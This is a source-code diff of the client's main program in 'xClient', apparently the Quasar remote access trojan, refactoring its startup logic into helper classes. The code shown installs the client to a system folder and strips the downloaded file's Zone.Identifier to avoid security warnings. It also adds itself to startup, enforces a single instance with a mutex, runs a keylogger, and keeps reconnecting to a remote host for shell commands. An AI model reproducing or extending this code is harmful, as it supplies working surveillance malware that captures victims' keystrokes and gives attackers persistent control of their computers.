@@ -4,11 +4,11 @@ using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 using xClient.Config;
-using xClient.Core;
 using xClient.Core.Commands;
 using xClient.Core.Data;
 using xClient.Core.Encryption;
 using xClient.Core.Helper;
+using xClient.Core.Installation;
 using xClient.Core.Networking;
 using xClient.Core.Packets;
 using xClient.Core.Utilities;
@@ -20,7 +20,6 @@ namespace xClient
         public static Client ConnectClient;
         private static bool _reconnect = true;
         private static volatile bool _connected = false;
-        private static Mutex _appMutex;
         private static ApplicationContext _msgLoop;
         private static HostsManager _hosts;
 
@@ -32,7 +31,7 @@ namespace xClient
 
             Settings.Initialize();
             Initialize();
-            if (!SystemCore.Disconnect)
+            if (!ClientData.Disconnect)
                 Connect();
 
             Cleanup();
@@ -47,8 +46,7 @@ namespace xClient
                 Keylogger.Instance.Dispose();
             if (_msgLoop != null)
                 _msgLoop.ExitThread();
-            if (_appMutex != null)
-                _appMutex.Close();
+            MutexHelper.CloseMutex();
         }
 
         private static void InitializeClient()
@@ -122,25 +120,31 @@ namespace xClient
 
             AES.PreHashKey(Settings.PASSWORD);
             _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
-            SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
-            SystemCore.MyPath = Application.ExecutablePath;
-            SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
-            SystemCore.AccountType = SystemCore.GetAccountType();
+
+            // https://stackoverflow.com/questions/3540930/getting-syswow64-directory-using-32-bit-application
+            if (PlatformHelper.Architecture == 64 && Settings.DIR == Environment.GetFolderPath(Environment.SpecialFolder.System))
+                Settings.DIR = NativeMethodsHelper.GetSystemWow64Directory();
+
+            ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
+
             GeoLocationHelper.Initialize();
 
-            if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
+            if (!MutexHelper.CreateMutex(Settings.MUTEX))
+                ClientData.Disconnect = true;
+
+            if (ClientData.Disconnect)
+                return;
+
+            FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
+
+            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
             {
-                if (!SystemCore.CreateMutex(ref _appMutex))
-                    SystemCore.Disconnect = true;
-
-                if (SystemCore.Disconnect)
-                    return;
-
-                new Thread(SystemCore.UserIdleThread).Start();
+                WindowsAccountHelper.StartUserIdleCheckThread();
 
                 if (Settings.STARTUP && Settings.INSTALL)
                 {
-                    SystemCore.AddToStartup();
+                    if (!Startup.AddToStartup())
+                        ClientData.AddToStartupFailed = true;
                 }
 
                 InitializeClient();
@@ -152,24 +156,19 @@ namespace xClient
                         _msgLoop = new ApplicationContext();
                         Keylogger logger = new Keylogger(15000);
                         Application.Run(_msgLoop);
-                    }).Start(); ;
+                    }).Start();
                 }
             }
             else
             {
-                if (!SystemCore.CreateMutex(ref _appMutex))
-                    SystemCore.Disconnect = true;
-
-                if (SystemCore.Disconnect)
-                    return;
-
-                SystemCore.Install();
+                MutexHelper.CloseMutex();
+                ClientInstaller.Install(ConnectClient);
             }
         }
 
         private static void Connect()
         {
-            while (_reconnect && !SystemCore.Disconnect)
+            while (_reconnect && !ClientData.Disconnect)
             {
                 if (!_connected)
                 {
@@ -190,7 +189,7 @@ namespace xClient
                     Thread.Sleep(2500);
                 }
 
-                if (SystemCore.Disconnect)
+                if (ClientData.Disconnect)
                 {
                     ConnectClient.Disconnect();
                     return;
@@ -205,7 +204,7 @@ namespace xClient
             if (reconnect)
                 CommandHandler.CloseShell();
             else
-                SystemCore.Disconnect = true;
+                ClientData.Disconnect = true;
             ConnectClient.Disconnect();
         }
 
@@ -216,14 +215,14 @@ namespace xClient
 
         private static void ClientState(Client client, bool connected)
         {
-            if (connected && !SystemCore.Disconnect)
+            if (connected && !ClientData.Disconnect)
                 _reconnect = true;
-            else if (!connected && SystemCore.Disconnect)
+            else if (!connected && ClientData.Disconnect)
                 _reconnect = false;
             else
-                _reconnect = !SystemCore.Disconnect;
+                _reconnect = !ClientData.Disconnect;
 
-            if (_connected != connected && !connected && _reconnect && !SystemCore.Disconnect)
+            if (_connected != connected && !connected && _reconnect && !ClientData.Disconnect)
                 LostConnection();
 
             _connected = connected;
